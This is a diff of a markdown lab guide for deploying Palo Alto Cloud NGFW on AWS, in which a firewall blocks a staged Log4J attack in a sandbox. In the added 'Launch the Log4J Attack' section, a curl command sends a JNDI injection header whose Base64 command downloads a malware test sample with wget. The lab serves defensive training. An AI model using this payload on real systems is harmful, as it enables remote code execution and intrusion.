@@ -291,7 +291,14 @@ sudo docker exec vul-app-1 /bin/sh -c 'ping att-svr'
 
 <br/>
 
-## Launch the Log4J Attack
+## Setup the Attacker App Server and launch the Log4J Attack
+Login to both the app-app and the att-app servers using the downloaded PEM or PPK file. Check the example below.
+
+```
+ssh -i <qwikLABS-xxxx-xxxx.pem> ec2-user@<public-ip-att-app-server>
+```
+
+**IMPORTANT:** Note that the login username to be used is “**ec2-user**”.
 
 42. On the **att-app-server** command prompt, execute this command to launch the Log4J attack.
 
@@ -390,11 +397,11 @@ We will now subscribe to Palo Alto Networks CloudNGFW service. Please follow the
 
 ## Create a Tenant
 
-58. Click on the ```Login or create vendor account``` to create a Tenant .
-
+58. Click on the ```Login or create vendor account``` to create a Tenant. In some cases is it possible that you receive the following error ```The vendor's webside is not available. Please try again or contact the vendor```. Is this happen open the Marketplace webside please in a normal Webbrowser (not in incognito) and repeat the steps again. 
+ 
 ![](https://lh6.googleusercontent.com/6FQVmdl6pN_KHI5B7n7DzEQYlqRjHSAKAEgDsdG17cvoRF0hwUgJZw2K3Te0xMLf6WM96SYgc7jRw0179-Ah6VVa1kke8qw0cBCaRVrphRu6fl9e6PqwxYz1Cc8mSqESfxDYfYLCMS7TgMYAys2JRaY)
 
-59. Provide an email address, first and last name.
+59. Provide an email address, first and last name. If you have already in the past registered to any other CloudNGFW on AWS instances, login with them.
 
 ![](https://lh3.googleusercontent.com/lmIJ6cLp7OF5vXjOYPGzSwODaSGvNxQm0a5poSk7rKsNT-FEWwFd1T4dtILzWEG7NZYd2X_CxOzpr9jVqy8bsW1P--x_TUqOvbl14hlrnCmcd6zwXY5U089CWTG5b5tJyk1OyUCqtq0J7FYI-zmPsTc)
 
@@ -415,7 +422,7 @@ We will now subscribe to Palo Alto Networks CloudNGFW service. Please follow the
 
 ![](https://lh5.googleusercontent.com/rOTNqX3DmXnLtDCwpWqasAMPlDTDPaZDDTLIwE5Qc3kJu_rMjVri5wYvUH9Q4XnM5QysdtizX8s2aQyUDRqX4qEoOct7kzGiFhc5goXYeXSOKri52ADeZclHmEehgZwyqyK7xdIABrvH22otpOe0Rtw)
 
-63.  Next click on ```Launch Template```  to configure the integration between your vendor and AWS. This will launch the AWS CFT console.
+1.   Next click on **Launch Template** to configure the integration between your vendor and AWS. This will launch the AWS CFT console.
 
 ![](https://lh6.googleusercontent.com/u2c4dJRj6JRPkvnaHL3wfZRepZR9t5Cr-r-V5Udaoig99Mk8tSfunwa9_r1pW7j5gaZ705onS_4zkvdpqiaJj_pX1fAs8p5MbJXChBQmdDjC4cPTGOMh3lLua255o8lMK9MO59-LcPLJRYZol5WhuuM)
 
@@ -434,13 +441,13 @@ We will now subscribe to Palo Alto Networks CloudNGFW service. Please follow the
 
 ![](https://lh5.googleusercontent.com/Faa5ZA2RgSI4uUJKEjPPQThaZMHzwiKxCDmz1LmWCcttSfaorxt-YWJetQDXBluA5nQ88V5aWbXRX_mwRakmF190K8pDDp1k29SiGyvEbOgmAVaonkBfQ2Z9UgTPeNfZTAQNdopT4tJ-culNrOnaoM0)
 
-68. Monitor the CFT deployment to ensure that it is successful. You might need to refresh for the latest status.
+68. Monitor the CFT deployment to ensure that it is successful. You might need to refresh for the latest status. The Deployment can take up to  **20 Minutes** 
 
 ![](https://lh6.googleusercontent.com/-1q-6SHnTguLgb7w1Oky_JthA4KuHaMJ1U9oTPmS0mnufr-q7DF69e_0aAZFPYGpw--DAIJ2qqBTbRrZ0uFYHBrBm5_3RtI89znrQn0MZwn4rgTI_lK-sr10FYORyUeaSUSgotWSP7NXHEWNss2m5u4)
 
 69. Now you have successfully subscribed to CloudNGFW service, created a tenant and associated your AWS account.
 
-70. Click on “Launch Product” to log in to the Cloud NGFW console.
+70. Click on **“Launch Product”** to log in to the Cloud NGFW console.
 
 ![](https://lh4.googleusercontent.com/PeLVGPV8fHasTQlmaSIHRwUZEQv02duW2BTjBKTpXURhk3ouH_4ZHW65ndwf2-laGLXQcbNtxrp1TxRAOj6sZ61UVr8gW7XwP5uAv1WPZWjfVAz6qaiClN427jPHHWWIXVQMY4YTvNXWMlCksYdAJHo)
 
@@ -448,7 +455,7 @@ We will now subscribe to Palo Alto Networks CloudNGFW service. Please follow the
 
 ![](https://lh6.googleusercontent.com/Hw4oCamOrUeWTosCCoxN4Evgd1kkoNZa6n2OcIJwr-E1EBliuRqIaUHEGBuGZd0YPMFrJ-lggFxV_qWPWomE-rsuM6fBLYeC7ga9alnmvIiUP297TCydjXEjUiR5hoeotkK1cPlxGm04hFyZXXKAj-c)
 
-72. Click the ‘Close’ button to finish creating the tenant.
+72. Click the **Close** button to finish creating the tenant.
 
 ![](https://lh4.googleusercontent.com/pEZY27iLfSkBSaOrVXF2UboVD_9tGsUj7OM6_Cfj3P9puSYmU9Ig6KbCOsExuAF1vH0iUodO2DNvSGDYYnY4mTblbV1zcWZAJxb11o9ISz5mV-ocd4k8wwuyZWeXZipEGNlWmxVkey5t1XaWQYIzIH8)
 
@@ -501,7 +508,7 @@ In this section you will be deploying CloudNGFW service on your application envi
 ![](https://lh6.googleusercontent.com/-a3a9hbzZvlfuLGzuRZPA3tPLvU3QLbat6dLB_IxtSQEFPH7b5Pi8jbOUzfB8pS4dKX3cdWpADt8yH2EspkLa0Qc4TuzYNUl3urWSyYUJbO0TVM8MBYG8ozP4MmV6JtYbTc5oy76cmbp_NefR18aGis)
 
 80. We will now create a rule that allows all traffic, but applies security best practices through _Security Profiles_. In the General section of the Create Rule Form,
-- Name the rule ‘MyFirstCloudNGFWRule’
+- Name the rule ‘Allow-ALL’
 - Set the Rule Priority to 1
 - In the Source and Destination section of the Create Rule Form, leave Source and Destination values as ‘any’
 
@@ -550,7 +557,7 @@ Note that the name of the security VPC is “**qwikLABS-sec-vpc**”. We will be
 ![](https://lh6.googleusercontent.com/_shcZlc-v4mJ_Ne1TBDku-ll2Q41zwt4j6LsCl1Rze1vnyN7Nh_BHoApWB7HsEPFllSxHsMAWITxsgKkUwe3MUHWeuAwrfPzJ28P__k2w0D6jDL9aiWrYSy11wjIGAZZaP20swZITGG3blP_Z11tLPU)
 
 88. In the General section of the Create Firewall form, 
-- Name your CloudNGFW instance ‘MyfirstCloudNGFW’
+- Name your CloudNGFW instance ‘CloudNGFW’
 - Select your AWS account
 - Set VPC to ‘qwikLABS-sec-vpc’
 
@@ -566,7 +573,7 @@ Note that the name of the security VPC is “**qwikLABS-sec-vpc**”. We will be
 
 ![](https://lh3.googleusercontent.com/SfwzOJqInWrZSIN2gc2U1n2F1yFwXXnL2lV-cl9hTzsNeKrSgpcpzy5FTffTHCErY5TYhUZ4IVvbZhFnWUF92ReMuqM3jQ7KCCV4EIUM8_R3uB3rrKRt8mkzLYmK9pP1UT4n71hyczOWuYUFF1WaasI)
 
-90. You have initiated deployment of CloudNGFW in the Qwiklab environment. The deployment will take around 10-15 mins to complete successfully.
+90. You have initiated deployment of CloudNGFW in the Qwiklab environment. The deployment will take around **10-15 mins** to complete successfully.
 
 <br/><br/>
 
@@ -606,14 +613,14 @@ In this session we will be creating firewall policies and experience how the bes
 
 ![](https://lh3.googleusercontent.com/jM-mzkwDqyOiY1wHX7qhMlXvcQViYovTEuDmczkouSeEzJAFYu5MJEkLFJzmaWY6uHHWrSPeTUjThRSfjYAb32WlP0iwzbxQQZRuRLeYHk7GCfsRr1l47KZNszLlXis3Lite06CTAIUHjHLnrSPqjb4)
 
-94. Set the log group name to **‘PaloAltoCloudNGFW’**. Note the name should match exactly in case. Click on ‘Create’.
+94. Set the log group name to **‘PaloAltoCloudNGFW’**. Note the name should match exactly in case. Click on ‘Create’. You can find the name again in CloudFormation deployment under **Paramaters and CloudwatchNamespace.**
 
 ![](https://lh6.googleusercontent.com/eQNt09fjAJoRNc6NPf7rsc3GRKSeMb7-e7sKq8fSCWgnzqx62VURXbyZu5rpXFjnnf5myYZeUDeo8eEp_LcPiouh5ScorocvqP361fdHYsPsK3ts_xmYxvt4GkTyef0Y8jGADz-ssME6cWsjuSYEgRk)
 
 ![](https://lh5.googleusercontent.com/6d0wpPqG_9I1T7uT3H9W1_NCsTIa16QA2rkDGcAk9bIoWF_w9b3E7Ifl0ltycFFW6EoqpVfGhhQpFmzwA_OAFYIcYNsnCJauxdz_hi1xXP2x2nEScifr45b35Y6pSBWdTrzIT_jXdhzD0xEBLmg9Lxs)
 
 95. Navigate back to the CloudNGFW console.
-96. Click on NGFWs and ‘myfirstCloudNGFW’
+96. Click on NGFWs and ‘myfirstCloudNGFW’ or the name you provided.
 
 ![](https://lh6.googleusercontent.com/PyfY5bolfUkyMAV18E_sFqwfyDN_oO_IlxX6vL7LYZ9m9foj5LNM6_sICCL56ZpgoJ4j8uk8CVtmp_UCPqkxg5dDOgzoVqH84Bmb-n3CVFQ31YlJAUO-W4NIp_6YMuyq1zWt-MVlrtMdoNuJIPxwpL8)
 
@@ -774,13 +781,69 @@ in that Lab part you will update the existing VPCs to use a second Availability 
 ## Steps to do
 
 1. Create in the Attack, Vulnerable and Security VPC a new Subnet for the Workloads and the TGW
-2. Update the Transit Gateway Attachments to use the Second VPC Subnet
-3. Log into the CloudNGFW Instance and create a new CloudNGFW endpoint in the new Security subnet
-4. Update the Security VPC Route table
+2. Remove static route **'0.0.0.0/0'** pointing to the GWLB Endpoint in the **sec-vpc-tgw-rt**
+3. Delete in the CloudNGFW WebUI under NGFWs the previous created CloudNGFW Instance
+   1. Deletion takes up to **~ 15 minutes**
+4. After deleting the old CloudNGFW create a new CloudNGFW instance and add both subnets of Security VPC **CloudNGFW WebUI**
+   1. Wait until the Endpoint is created **(~ 15 minutes)**
+5. Create in the WebUI new Route Tables for the newly created Subnets
+   1. Associate the Subnets
+   2. Create a static route (0.0.0.0/0) to the related GWLB Endpoint (TGW subnet)
+   3. Create a static route (0.0.0.0/0) to the related TGW Endpoint (security subnet)
+6. In the route tables **qwikLABS-att-vpc-rt** and **qwikLABS-vul-vpc-rt** associate the related previous created subnets to it
+7. Modify all 3 existing Transit Gateway Attachments and add the Second VPC Subnet
+8. Verify the communication between **Vul-App-Server** and **Att-App-Server**
+9. Create in the **qwikLABS-vul-vpc** a new Instance in the subnet AZ-B
+
+
+## Launch the Log4J Attack
+
+1. Verify communication between Attacker Server and newly created instance
+    1.  ping 10.1.2.100
+2. if the communication works fine update in the Attacker Server th **launch_attack.sh** script
+    1.  sudo vi /tmp/launch_attack.sh
+    2.  add the following command.
+   ```curl 10.1.2.100:8080 -H 'X-Api-Version: ${jndi:ldap://att-svr:1389/Basic/Command/Base64/d2dldCBodHRwOi8vd2lsZGZpcmUucGFsb2FsdG9uZXR3b3Jrcy5jb20vcHVibGljYXBpL3Rlc3QvZWxmIC1PIC90bXAvbWFsd2FyZS1zYW1wbGUK}'```
+
+3.   On the **att-app-server** command prompt, execute this command to launch the Log4J attack.
+
+```
+/tmp/launch_attack.sh
+```
+
+1.   This time, you will not see the ‘Hello, world” message as the attack will have been blocked by the NGFW.
+
+![](https://lh6.googleusercontent.com/n9Z6WR3jJHVxh_5N8TRB-IB2jW0mRal8FwYVW6w09968Gw-sLEB90cKNEdn6YCZsU7YjkgaV4qtV3fJ3yi41qsxIvQvehgUrMWWKulN-oyOH4phjTxzYfFJoEW6I-pMzkVxzCJCsmWfzV1zZ470)
+
+<br/>
+
+## Monitor threat log
+
+1.   Navigate to the AWS Console browser tab, on the Search bar at the top of the page, type “cloudwatch” and select “CloudWatch” from the search results.
+2.   From the left menu, click on “Log groups” and from the list of Log groups, select “PaloAltoCloudNGFW”.
+3.   Navigate to AWS CloudWatch browser tab and click on ‘Log Groups’
+4.   Click on the THREAT log file.
+
+![](https://lh5.googleusercontent.com/6_x3TcTGkZv2VPIJBxeoDlDG980gohlde3O62gCeQwVsQ1gKf3D1psP9ERpFJTuThYbf0wRjKsJAp2kKzoP4RU7MZUL-Bh17YhSbaLy5yICANUnCFdNZV_BgheGiMOi-3YlQANcUcPtnsVQQz0poo68)
+
+1.   Click on the arrow to open the log. You can see that CloudNGFW successfully detected and prevented the attempted Log4J attack.
+
+<br/>
+Threat Log Vul App Server 1
+
+![](https://raw.githubusercontent.com/torstenstern/ps-lab-aws-cloud-ngfw/main/pictures/threatlogserver1.png)
+
+<br/>
+Threat Log Vul App Server 2
+
+![](https://raw.githubusercontent.com/torstenstern/ps-lab-aws-cloud-ngfw/main/pictures/threatlogserver1.png)
+
 
 <br/>
 
 CREATE HERE A SECRET ;) 
+subnet.png
+createnewendpoint.png
 
 <br/><br/>
 
